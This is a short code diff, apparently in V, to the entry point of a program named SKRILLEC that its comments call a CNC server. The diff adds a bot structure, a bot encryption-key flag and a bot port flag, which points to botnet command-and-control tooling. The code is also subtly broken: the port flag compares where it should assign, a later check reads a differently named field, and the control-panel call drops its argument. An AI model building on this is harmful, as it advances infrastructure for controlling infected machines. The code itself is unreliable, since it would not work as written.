@@ -32,7 +32,7 @@ fn main() {
 		port: info[1].u32(),
 		username: info[2],
 		dbname: info[3]
-	}, current: &server.Current{}, notice: &utils.NotificationSys{}}
+	}, current: &server.Current{}, notice: &utils.NotificationSys{}, bots: &server.Bots{}}
 	// Update Check. Making sure this is the latest update or it will ask you to update the binary!
 	server.update_check()
 	
@@ -43,6 +43,8 @@ fn main() {
 		if v == "-p" { svr.set_port(cmd_args[i+1]) } // Setting Port If Found!
 		if v == "-sqlpw" { svr.sqlconn.password = cmd_args[i+1] } // Setting MySQL PW
 		if v == "-t" { svr.cnc_key = cmd_args[i+1] } // Setting SKRILLEC License Key
+		if v == "-b_key" { svr.bot_encryption = cmd_args[i+1] } // Grab Bot Encryption Key (add a error handler down below)
+		if v == "-b_port" { svr.bot_port == cmd_args[i+1] } // Grab the bot port to host on (add a error handler down below)
 
 		if v == "-reset_config" {
 			if cmd_args[i+1] == "MySQL" {
@@ -76,6 +78,11 @@ fn main() {
 		svr.set_port(port)
 	}
 
+	if svr.b_port.len == 0 { 
+		println("[x] Warning. No bot port was provided, use the '-b_port' flag to set a port for the bot or use '--help' for more help!")
+		exit(0)
+	}
+
 	// License token validation
 	if server.validate_token(mut &svr) == 0 {
 		exit(0)
@@ -83,5 +90,5 @@ fn main() {
 	// Start Server In a Thread (Background)
 	go server.start_skrillec(mut &svr)
 	// Start the CNC CP to control the CNC from server/VPS!
-	skrillec_cp.main_cp(mut &svr)
+	skrillec_cp.main_cp()
 } 
